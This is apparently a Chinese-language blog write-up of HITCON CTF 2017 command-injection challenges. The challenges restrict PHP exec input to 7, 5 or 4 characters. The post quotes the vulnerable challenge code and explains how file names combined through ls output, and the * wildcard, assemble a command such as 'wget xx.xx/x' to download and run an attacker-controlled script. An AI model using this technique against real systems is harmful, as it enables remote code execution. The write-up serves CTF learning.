---
title: the “*” in ubuntu
date: 2017-11-08 13:22:54
tags: [学习,记录]
categories: 
---

## 0x00.前言

最近，大佬们在讨论hitcon-ctf中几道有意思的题，小菜我从中观看表哥“表演”，惊叹其神乎其神的“刀法”。在此之前我们先看一个例子:

![16](http://myndtt.github.io/images/16.png)

上图中的“*”是不是很神奇！

<!-- more -->

## 0x01.记录



### 7位

```php
<?php
if(strlen($_GET[1])<8){
     echo shell_exec($_GET[1]);
}
?>
```

要说星号，得先从不久之前说起。之前，就有这么一道题。当时已经有很多大佬给出了解法：

https://leet2.com/archives/limited-7-character-command-to-getshell.html

我第一次看到这解法也是神乎其神，太厉害了。核心意思就是建立一些个文件，文件名字要特殊一些，这样当我们用“ls”或者“ls -t”命令时，控制台下面显示的将会是文件名字，当然指令不同，文件排序不同。

#### 第一步

例如如果我们能够建立名字分别如“ls”，“-t”，">q"的三个文件并且当用ls命令确实也是这样依次显示，则用ls >a命令时ls的输出就会到a中，看图：

![17](http://myndtt.github.io/images/17.png)

指令意思大致依次为：

```sh
1.建立文件名字为1的文件     >1
2.建立文件名字为2的文件     >2
3.将ls命令的结果保存至文件a中（如果此前没有文件a,则创造文件）   ls >a
4.查看文件a                                                 cat a
```

这样当我们创造出邪恶的文件名字，就会在文件比如a中存有特殊的指令（指令“sh a”就会执行a脚本，a文件中有指令当然要执行咯），那问题来了，我们要这些干什么呢？

#### 第二步

当然有用！当文件名依次是 "weget",  "xx.xx/x" 的时候，执行ls >q那么q文件中是不是就有了 weget xx.xx/x字符呢,然后再次执行sh q 就等于用weget指令从 xx.xx下载了x文件，此时文件x由自己控制，在该文件中可以是其他指令，再次sh x ，那么想要执行什么就可以执行什么了。

#### 注意

指令由文件名字联合而来，所以要在命令"ls"或者其他如ls -t 下，文件依次连起来正好是你的指令。一般来说，你的域名合适的话，可以用ls,不合适的话只能用ls -t 来将文件按照时间排序。因为我们创造文件先后可控则ls -t也可以控，可是ls -t 这个命令很长，比如对下面的5位的来说就...

### 5位

```php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

这就是该hitcon-ctf中的一道题，如果你以前做过上诉那道题，就知道大概方法了，只是长度的问题，并且要合理的利用好上诉的第一步从而产生类似“ls -t >x”(x为文件名字)指令。表哥们已经解释的很详细了。

https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2017/babyfirst-revenge

https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/

## 0x02.学习

### 4位

```php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

当你还是用上诉的那个方法去做这题时，你会发现不可能，长度太有限，只有4位，创建文件都很难了。当没有很好的域名，那么必须要在第一步中创建出ls  -t >a命令 可是字符要求越来越短，等于说难度越来越高。所以回到刚开始的“*”,星号在linux中是文件通配符，用来匹配文件:

![18](http://myndtt.github.io/images/18.png)

https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/babyfirst-revenge-v2/exploit.py

按照表哥的writeup得，你会发现居然是这么神奇：

![20](http://myndtt.github.io/images/20.png)

神奇在恰好有"rev"这个反转指令，关键是指令其中有排序在字母r后面的字母v！

这里涉及到字符反转，因为确实要产生合理的文件顺序

![19](http://myndtt.github.io/images/19.png)

如上图不反转，”dir“后面接上”ls “不会达到效果，echo可以但是却超过长度。（要创建echo 指令”>echo“正好为5大于4），同是后面还需要>q，排序不一样了，也不行。

## 0x03.总结

做这类题很艺术，看似动尽心思，实则为平时积累和实力所致。感谢最后龙师兄的帮助，一语点醒。哈哈。